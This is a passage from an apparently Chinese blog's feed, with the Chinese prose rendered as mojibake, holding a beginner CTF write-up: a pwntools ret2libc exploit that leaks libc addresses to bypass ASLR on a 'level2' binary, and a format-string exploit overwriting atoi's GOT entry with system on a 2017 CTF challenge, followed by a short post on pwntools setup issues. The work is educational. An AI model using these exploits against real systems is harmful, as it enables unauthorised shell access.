<span class="n">binsh_addr</span><span class="o">=</span><span class="mh">0xf7f5e42d</span>
<span class="n">payload</span> <span class="o">=</span>  <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>ç»“æœå¦‚ä¸‹ï¼š
<img src="/img/pwn/19.jpg" alt="6.jpg"></p>
<h2 id="0x02-ret2libcç»•è¿‡aslrpie">0x02 ret2libc(ç»•è¿‡ASLR/PIE)</h2>
<p>æ–‡ä»¶ï¼šè¿˜æ˜¯level2
ä¿æŠ¤ï¼šASLR NX
ä¸‹é¢æˆ‘ä»¬æŠŠç³»ç»ŸASLR/PIEé˜²æŠ¤å¼€å¯ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo -s
<span class="nb">echo</span> <span class="m">2</span> &gt;  /proc/sys/kernel/randomize_va_space
</code></pre></div><p><img src="/img/pwn/20.jpg" alt="figure">
è¿™é‡Œå°±ä¸èƒ½åƒä¸Šé¢˜é‚£æ ·å°†è¿”å›åœ°å€è¦†ç›–æˆlibcåº“å‡½æ•°çš„åœ°å€äº†ï¼Œå› ä¸ºæ¯æ¬¡æ‰§è¡Œlibcçš„åœ°å€ä¼šæœ‰ä¸€å®šçš„åç§»ï¼Œä½†æˆ‘ä»¬ä»ç„¶èƒ½å®šä½åˆ°libcåº“å‡½æ•°çš„åœ°å€ã€‚å…·ä½“æ€ä¹ˆåšå‘¢ï¼Ÿ
level2å†…çš„vulnerable_function()å†…è°ƒç”¨readå‡½æ•°æ—¶ï¼Œæ‰§è¡Œäº†call &lt;read@plt&gt;æŒ‡ä»¤ï¼Œpltæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ<a href="https://www.freebuf.com/articles/system/135685.html">è¿™é‡Œ</a>æœ‰è¯¦ç»†çš„è§£é‡Šã€‚æ–‡ç« å†…æˆ‘åªç®€å•è§£é‡Šã€‚ã€‚
æˆ‘ä»¬å…ˆè¯»å–level2æ–‡ä»¶çš„elfç»“æ„ï¼š
<img src="/img/pwn/21.jpg" alt="figure">
å‘ç°.pltæ®µåœ¨level2æ–‡ä»¶å†…ï¼Œå’Œç¨‹åºæ®µ.textæ˜¯åˆ†å¼€çš„ã€‚
è¿™é‡Œå°±ä¸æ”¾å›¾äº†ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘stepè¿›call &lt;write@plt&gt;çš„æ—¶å€™ç›´æ¥è·³åˆ°äº†writeæ±‡ç¼–ç¨‹åºåœ°å€ï¼Œç«‹ä¸ªflag, æœ‰ç©ºè¡¥ä¸Šã€‚
ç®€å•çš„è¯´ï¼Œpltæ˜¯ä¸ªè·³è½¬è¡¨ è·³è½¬åˆ°gotè¡¨ä¸­readå‡½æ•°åœ°å€æŒ‡é’ˆæ‰€åœ¨çš„åŒºåŸŸï¼Œç„¶ååœ¨gotè¡¨å†…å†è·³è½¬ï¼Œæœ€ç»ˆæ‰ä¼šè·³è½¬åˆ°writeå‡½æ•°çš„åœ°å€ã€‚è¿™ç§é“¾æ¥é‡‡ç”¨çš„æ˜¯å»¶è¿Ÿç»‘å®šæŠ€æœ¯ï¼Œæ‰§è¡Œç¬¬ä¸€ä¸ªlibcåº“å‡½æ•°æ—¶ï¼Œlibcæ‰ä¼šé“¾æ¥åˆ°åˆ°level2ï¼Œç”±äºæˆ‘ä»¬åœ¨vulnerable_function()ä¸­æ‰§è¡Œäº†read(),write()åœ°å€ä¹Ÿå°±å›ºå®šäº†ã€‚ï¼ˆæ•´ä¸ªè¿‡ç¨‹æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå¦‚æœä½ æƒ³æ·±å…¥äº†è§£è¿˜å¾—å¤šçœ‹çœ‹å…¶ä»–èµ„æ–™ï¼‰ã€‚</p>
<p>ä¸‹é¢è¯´è¯´ç»•è¿‡ASLR/PIEçš„æ€è·¯ï¼š
ä¸Šæ–‡æåˆ°ï¼šè°ƒç”¨libcåº“å‡½æ•°é‡‡ç”¨å»¶è¿Ÿç»‘å®šæŠ€æœ¯ï¼Œæ‰§è¡Œç¬¬ä¸€ä¸ªlibcåº“å‡½æ•°æ—¶ï¼Œlibcæ‰ä¼šé“¾æ¥åˆ°åˆ°level2ï¼Œç”±äºæˆ‘ä»¬åœ¨vulnerable_function()ä¸­æ‰§è¡Œäº†read(),write()åœ°å€ä¹Ÿå°±å›ºå®šäº†ã€‚å› æ­¤ç¬¬ä¸€æ­¥æ˜¯å…ˆè·å–åˆ°writeå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œè®°ä¸ºwrite_addrã€‚ç”±äºwrite()å’Œsystem()åœ¨libcä¸­çš„ç›¸å¯¹ä½ç½®æ˜¯å›ºå®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»¬ä¹‹é—´çš„åç§»é‡å›ºå®šï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥å…ˆäº‹å…ˆè·å–åç§»é‡ï¼Œç„¶åå€ŸåŠ©readå‡½æ•°ä½œä¸ºè·³æ¿ï¼Œå°±èƒ½å¾—åˆ°system()çš„åœ°å€sys_addräº†ã€‚åŒæ ·çš„&quot;/bin/sh&quot;çš„åœ°å€ä¹Ÿèƒ½å›ºå®šï¼Œbinsh_addrä¹Ÿå‡ºæ¥äº†ã€‚
expå¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;level2&#39;</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level2&#39;</span><span class="p">)</span>
<span class="c1">#p = remote(&#39;127.0.0.1&#39;, 10003)</span>
<span class="n">plt_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="nb">print</span> <span class="s1">&#39;plt_write= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span>
<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="nb">print</span> <span class="s1">&#39;got_write= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span>
<span class="n">vulfun_addr</span> <span class="o">=</span> <span class="mh">0x08048404</span>
<span class="nb">print</span> <span class="s1">&#39;vulfun= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###sending payload1 ...###&#34;</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###receving write() addr...###&#34;</span>
<span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="nb">print</span> <span class="s1">&#39;write_addr=&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###calculating system() addr and </span><span class="se">\&#34;</span><span class="s2">/bin/sh</span><span class="se">\&#34;</span><span class="s2"> addr...###&#34;</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
<span class="nb">print</span> <span class="s1">&#39;system_addr= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)))</span>
<span class="nb">print</span> <span class="s1">&#39;binsh_addr= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">140</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###sending payload2 ...###&#34;</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>æ•ˆæœå¦‚ä¸‹ï¼š
<img src="/img/pwn/22.jpg" alt="figure"></p>
<h2 id="0x03æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">0x03æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2>
<p>æ–‡ä»¶ï¼špwne (2017æ¹–æ¹˜æ¯pwn200èµ›é¢˜)
ä¿æŠ¤ï¼šASLR NX
printfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å¸¸è§çš„æœ‰ %dï¼Œ%fï¼Œ%cï¼Œ%sï¼ˆç”¨äºè¯»å–å†…å­˜æ•°æ®ï¼‰ï¼Œ%xï¼ˆè¾“å‡º16è¿›åˆ¶æ•°ï¼Œå‰é¢æ²¡æœ‰0xï¼‰ï¼Œ%pæˆ–%#xï¼ˆè¾“å‡º16è¿›åˆ¶æ•°ï¼Œå‰é¢å¸¦æœ‰0xï¼‰ï¼›%næ˜¯ä¸€ä¸ªä¸ç»å¸¸ç”¨åˆ°çš„æ ¼å¼ç¬¦ï¼Œå®ƒçš„ä½œç”¨æ˜¯æŠŠå‰é¢å·²ç»æ‰“å°çš„é•¿åº¦å†™å…¥æŸä¸ªå†…å­˜åœ°å€ï¼Œç”¨äºä¿®æ”¹å†…å­˜ï¼Œé™¤äº†%n,è¿˜æœ‰%hnï¼Œ%hhnï¼Œ%llnï¼Œåˆ†åˆ«ä¸ºå†™å…¥ç›®æ ‡ç©ºé—´4å­—èŠ‚ï¼Œ2å­—èŠ‚ï¼Œ1å­—èŠ‚ï¼Œ8å­—èŠ‚ã€‚</p>
<p>ç»¼ä¸Šï¼Œæ ¼å¼åŒ–å­—ç¬¦å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šè¯»å–æ•°æ®æ ¼å¼ç¬¦å’Œå†™å…¥æ•°æ®æ ¼å¼ç¬¦ã€‚</p>
<p>è¿™é‡Œè¯´ä¸€ä¸‹ï¼Œä¸æ˜¯æ‰€æœ‰Cç¼–è¯‘å™¨éƒ½æ”¯æŒ%n, æˆ‘åœ¨windowsä¸Šçš„codeblocksé…çš„æ˜¯C99æ ‡å‡†çš„gccç¼–è¯‘å™¨ï¼Œæ‰§è¡Œæ— æ³•é %nå†™å…¥æ•°æ®ï¼Œåœ¨è¿™é‡Œæˆ‘ä¹Ÿæœ‰ç‚¹è¿·æƒ‘ï¼Œå‡ºé¢˜çš„äººåˆ°åº•æ˜¯ç”¨çš„ä»€ä¹ˆç¼–è¯‘å™¨ã€‚ã€‚</p>
<p>æ—¢ç„¶æœ¬åœ°ä¸ä¸€å®šèƒ½åšåˆ°ï¼Œé‚£å°±ç”¨ç°æˆçš„é¢˜ç›®æ–‡ä»¶å§ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬ç”¨è¿™ä¸ªæ–‡ä»¶çœ‹ä¸€ä¸‹åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¯»å–æ•°æ®çš„æ–¹æ³•ï¼š
<img src="/img/pwn/23.jpg" alt="figure">
æˆ‘ä»¬çœ‹åˆ°ï¼Œç¬¬ä¸ƒä¸ª%xå–å€¼æ˜¯0x41414141, ä¹Ÿå°±æ˜¯AAAAçš„asciiç ï¼Œé€ æˆå†…å­˜æ³„æ¼äº†ã€‚
è§£é‡Šï¼šè¯¥æ–‡ä»¶GET YOUR NAME:åï¼Œ æ‰§è¡Œçš„æ˜¯printf(str)ã€‚
ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒæŠŠæˆ‘ä»¬çš„è¾“å…¥å½“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰§è¡Œäº†ã€‚
æˆ‘ä»¬%xå–çš„å…¶å®æ˜¯å¯„å­˜å™¨ä¸­çš„å†…å®¹ï¼Œå¯„å­˜å™¨é‡Œé¢åˆå­˜ä»€ä¹ˆå‘¢ï¼Ÿ
æ˜¯printfé™¤æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤–çš„å‚æ•°ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰è¾“å…¥å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯„å­˜å™¨çš„å†…å®¹å…¶å®æ˜¯åƒåœ¾å€¼ã€‚</p>
<p>é‚£åˆä¸ºä»€ä¹ˆåœ¨ç¬¬ä¸ƒä¸ª%xå–å€¼ä½ç½®è¾“å‡ºäº†AAAAå‘¢ï¼Ÿ
å› ä¸ºè°ƒç”¨printfåï¼Œé¦–å…ˆå†æŠŠæ ¼å¼åŒ–å­—ç¬¦ä¸²å‹æ ˆï¼Œå†æŠŠå‚æ•°åœ°å€å­˜è¿›å¯„å­˜å™¨å’Œæ ˆä¸­ï¼Œå†æŠŠæ‰€æœ‰èƒ½ç”¨çš„å¯„å­˜å™¨å‹æ ˆï¼Œæœ€åå­˜è¿›äº†ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æŒ‡é’ˆï¼ˆç”¨æ¥æŒ‡å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ï¼Œæ£€ç´¢æ ¼å¼ç¬¦ï¼‰ï¼Œæˆ‘è¿™ä¸ªubuntu linuxå†…å¯„å­˜å™¨åœ°å€åŠ ç©ºç™½åœ°å€ä¸€å…±å…­ä¸ªå››å­—èŠ‚ç©ºé—´ï¼Œç¬¬ä¸ƒä¸ªå–åˆ°çš„å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„AAAAäº†ã€‚
æ ˆå›¾(ç½‘ä¸Šæ‰¾çš„)å¦‚ä¸‹ï¼š
<img src="/img/pwn/23.png" alt="figure">
å¢¨ç»¿æ˜¯å¯„å­˜å™¨åœ°å€ï¼Œè“è‰²æ˜¯ç©ºç™½ä½æˆ–è€…é¢å¤–çš„å­˜å‚¨å‚æ•°ç©ºé—´ï¼Œç»¿è‰²æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²å†…å®¹ï¼Œæ©™è‰²æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒ‡é’ˆã€‚</p>
<p>å¤¸å¼ çš„æ˜¯ï¼Œ%xèƒ½æ³„éœ²æ ˆä¸Šé«˜åœ°å€ä½çš„å†…å®¹ï¼Œ%nçš„ä¿®æ”¹å†…å­˜çš„åŠŸèƒ½ï¼Œèƒ½å°†æ›´æ”¹ä»»æ„å‡½æ•°çš„è°ƒç”¨ã€‚è¿™ä¸¤è€…ç»“åˆç®€ç›´æ— æ³•æ— å¤©ã€‚</p>
<p>ä¸‹é¢è¿›å…¥é¢˜ç›®åˆ†æç¯èŠ‚ã€‚ã€‚ã€‚ï¼š
IDA proåˆ†æï¼š
<img src="/img/pwn/24.jpg" alt="figure">
è¿™é“é¢˜äº†é‡Œï¼Œæˆ‘ä»¬å…ˆåˆ©ç”¨%$7x(å–ç¬¬7ä¸ªå››å­—èŠ‚æ•°)ï¼Œ è¿”å›putså‡½æ•°é“¾æ¥åçš„åœ°å€ã€‚ç„¶åç”¨%næ”¹å˜atoiçš„è°ƒç”¨ï¼Œä½¿å®ƒçš„è°ƒç”¨åœ°å€æŒ‡å‘systemçš„å‡½æ•°åœ°å€ï¼ˆç”¨åç§»é‡ç®—ï¼‰,è¾“å…¥çš„ageæ²¡ç»è¿‡ç±»å‹æ£€æŸ¥ï¼Œç›´æ¥æ¢æˆ&quot;/bin/sh&quot;, å¤§åŠŸå‘Šæˆã€‚
exp:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwne&#39;</span><span class="p">)</span>
<span class="c1"># conn=remote(&#39;ip&#39;,port)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
<span class="c1">#libc=ELF(&#39;./libc.so.6&#39;)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwne&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[Y/N]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;NAME:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;WELCOME </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">puts_addr</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
<span class="c1"># print u32(put_addr)</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">u32</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
<span class="n">atoi_got_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;17&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[Y/N]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;NAME:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">atoi_got_addr</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">}))</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;GET YOUR AGE:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>æ•ˆæœå¦‚ä¸‹ï¼š
<img src="/img/pwn/25.jpg" alt="figure"></p>
]]></content>
		</item>
		
		<item>
			<title>pwntoolsä¸‹è¸©çš„å‘</title>
			<link>https://shankisme.com/posts/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/</link>
			<pubDate>Tue, 25 Feb 2020 19:03:01 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/</guid>
			<description>çº¯pwnå°ç™½åœ¨ç–«æƒ…æœŸé—´æ— èŠï¼Œäºæ˜¯å¼€å§‹ç©èµ·äº†pwnã€‚æœŸé—´åœ¨iæ˜¥ç§‹,freebufï¼ŒçŸ¥ä¹ä¸Šéšä¾¿çœ‹äº†å‡ ç¯‡å…¥é—¨æ‰‹å†Œï¼Œéš¾å—çš„æ˜¯æŠ€æœ¯æ´»ä»€ä¹ˆéƒ½çœ‹ä¸æ‡‚ã€‚ã€‚è·ç¦»ä¸Šæ¬¡æ¥è§¦æ±‡ç¼–æ˜¯å¤§ä¸€ä¸‹å­¦æœŸå§ï¼Œå½“æ—¶è®¡ç®—æœºç³»ç»Ÿçš„å®è·µè¯¾ç¨‹è¦æ±‚åšæŸå¸¸é’è—¤çš„bomblab,å½“æ—¶è·Ÿç€å¤§ä½¬çš„æ­¥éª¤å‹‰å¼ºå®Œæˆä¸‰å…³ã€‚æ¢ç´¢çš„è¿‡ç¨‹å¾ˆç´¯ï¼Œå°¤å…¶æ˜¯åœ¨æ±‡ç¼–çŸ¥è¯†è¿˜æ²¡æ¶ˆåŒ–å®Œï¼Œå°±å»åšret2somefuncçš„é¢˜ï¼Œä¸€ä¸ªå­—ï¼šéš¾ï¼Œä¸¤ä¸ªå­—ï¼šéš¾é¡¶ã€‚
åºŸè¯ä¸å¤šè¯´ï¼Œä¸‹é¢è®°å½•é…pwntoolsç¯å¢ƒè¸©çš„å‘ã€‚å½“ç„¶è¸©å‘è¿˜æ˜¯å› ä¸ºæ²¡æœ‰å…ˆå¥½å¥½è¯»å®˜æ–¹æ–‡æ¡£ã€‚
0x00 ä»‹ç» pwntools(v2.0)æ˜¯ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬çš„pythonåº“ï¼Œè®¾è®¡è€…å°†å®ƒåˆ†ä¸ºä¸¤ä¸ªæ¨¡å—ï¼špwnlibä¸pwnã€‚ pwnlibæ˜¯ä¸ªå¹²å‡€çš„æ¨¡å—ï¼Œé€‚åˆåˆå­¦è€…å¿«é€Ÿå…¥é—¨ã€‚è€Œpwnæ˜¯æ‰“CTFä¸“ç”¨çš„å·¥å…·ç®±ï¼Œæ˜¯pwnlibçš„è¶…é›†ï¼ŒåŠŸèƒ½æ›´å¤šï¼Œä¹Ÿæ›´éš¾å…¥é—¨ã€‚å…·ä½“ä»‹ç»è¯·çœ‹pwntoolsæ–‡æ¡£ã€‚
0x01 pwntoolsä¸é€‚é…windowsä¸­çš„pythonã€‚ æˆ‘å…ˆå°è¯•åœ¨windowsç¯å¢ƒä¸‹pip install pwnã€‚å¾ˆå¿«å°±è£…å¥½äº†ï¼Œæœ¬ä»¥ä¸ºç›´æ¥è¿è¡Œpythonè„šæœ¬å°±å¤§åŠŸå‘Šæˆäº†ï¼Œç»“æœç¼–è¯‘å™¨å‘Šè¯‰æˆ‘ï¼š
è¡Œå§ï¼Œç¼ºä¸œè¥¿ï¼Œå’±ç”¨pipè¡¥ä¸Šï¼Œä½†æ˜¯å‘ç°_cursesä»…æ”¯æŒlinuxï¼Œå·§çš„æ˜¯åœ¨winå¹³å°ä¸Šæœ‰å¯¹åº”è½®å­ã€‚ç„¶åè¿˜æ˜¯ä¼šæœ‰é—®é¢˜ï¼Œå°±å¼€å§‹æ— é™æ‰“è¡¥ä¸ã€‚ã€‚å½“ç„¶æœ€åè„‘å­æ²¡æŠ½åˆ°åº•ï¼Œæ¢åˆ°äº†linuxå†…,è¿™é‡Œæ¨èubuntu linux 64ã€‚
0x02 è¦æƒ³æ–¹ä¾¿æµç•…å†™expï¼Œæœ€å¥½è£…åœ¨python2å†…ã€‚ ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºä»python3å¼€å§‹ï¼Œstrå’Œbytesçš„è¾¹ç•Œä¸å†æ¨¡ç³Šã€‚python2ä¸­ str+bytesèƒ½åˆå¹¶æˆbytesï¼Œé»˜è®¤å°†strä»¥asciiç¼–ç è§£ç ï¼Œè€Œpython3ä¸­ï¼Œé™¤éåŠ æ³•é‡å®šå‘ï¼Œå¦åˆ™æ— æ³•åˆå¹¶æˆç»Ÿä¸€æ ¼å¼ã€‚æ‰€ä»¥åœ¨python3ä¸­è¦æƒ³åˆå¹¶strå’Œbytesã€‚åªèƒ½str.encode(&#39;ascii&#39;)+bytesæˆ–è€…str.encode+bytes.decode(&#39;ascii&#39;)
0x03 pwntoolsä¸é€‚åˆè£…åœ¨32ä½ç³»ç»Ÿä¸­ è¯¥å‘æ˜¯æˆ‘åœ¨ubuntu 32å®‰è£…pwntoolsé‡åˆ°çš„ï¼Œæ‰§è¡Œexpä¼šæœ‰è­¦å‘Šï¼Œpwntoolsä»ç„¶ä¼šèµ·ä½œç”¨ï¼Œä½†æ˜¯å…·ä½“ä¼šäº§ç”Ÿä»€ä¹ˆå½±å“æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œå› ä¸ºå½“æ—¶è¿˜åœ¨å†™æœ€ç®€å•çš„exp, æ ˆæº¢å‡ºæ”»å‡»ï¼Œret2shellcodeæ”»å‡»ã€‚
å¦å¤–ï¼ŒpwntoolsçœŸçš„æ˜¯éå¸¸å¥½çš„å·¥å…·ï¼Œæ¥å£å¾ˆé½å…¨ï¼Œè°ç”¨è°çŸ¥é“ã€‚
å®Œã€‚</description>
